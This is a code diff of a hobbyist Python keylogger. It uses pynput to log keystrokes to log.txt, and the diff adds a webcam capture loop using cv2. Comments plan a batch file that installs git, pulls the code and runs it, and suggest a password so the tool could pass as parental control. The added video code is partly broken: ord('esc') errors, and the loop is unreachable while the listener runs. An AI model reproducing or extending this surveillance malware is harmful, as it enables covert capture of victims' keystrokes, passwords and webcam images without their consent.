@@ -2,8 +2,10 @@ import pynput
 from pynput.keyboard import Key,Listener
 import webbrowser
 import os, atexit
+import cv2
 
 
+#keylogger
 
 with open("log.txt","a") as f:
     f.write("\n")
@@ -68,8 +70,18 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release)as listener:
     listener.join()
 
-#make a batch file that installs git(how tf....?) and pulls the code and runs it(run u need to figure out.)
+#video recorder
+vid=cv2.VideoCapture(0)
+while True:
+    ret, frame = vid.read()
 
+    cv2.imshow('frame', frame)
+
+    if cv2.waitKey(1) & 0xFF == ord('esc'):
+        break
+#make a batch file that installs git(how tf....?) and pulls the code and runs it(run u need to figure out.)
+vid.release()
+cv2.destroyAllWindows()
 #ethical:add a pw for this so that it can work as a parental control thing.
 
 
